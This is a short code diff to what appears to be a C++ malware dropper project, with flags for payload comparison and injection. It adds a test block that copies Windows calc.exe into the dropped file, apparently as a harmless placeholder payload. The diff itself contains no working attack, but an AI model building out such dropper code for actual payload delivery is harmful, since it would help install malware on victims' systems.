@@ -59,6 +59,7 @@ void setup_name();
 // #define RANDOM_NAME
 #define NAME_SIZE 10
 #define PAYLOAD_CMP_TEST
+#define DROPPER_EXTRACT_TEST
 //#define INJECT
 
 // global: final binary name
@@ -294,6 +295,26 @@ void drop(int size, void* buffer)
         result = system(cmd.c_str());
 	std::cout << "This is result: " << result << "\n";
 #endif
+
+#ifdef DROPPER_EXTRACT_TEST
+
+	FILE* src = fopen("C:\\Windows\\System32\\calc.exe", "rb");
+	FILE* dst = fopen(name, "wb");
+
+	unsigned char bfr[4096];
+	size_t bytesRead;
+
+	while ((bytesRead = fread(bfr, 1, sizeof(bfr), src)) > 0){
+		size_t bytesWritten = fwrite(bfr, 1, bytesRead, dst);
+		if (bytesWritten != bytesRead){
+			perror("write error");
+			break;
+		}
+	}
+
+	fclose(src);
+	fclose(dst);
+#endif 
 
 }
 
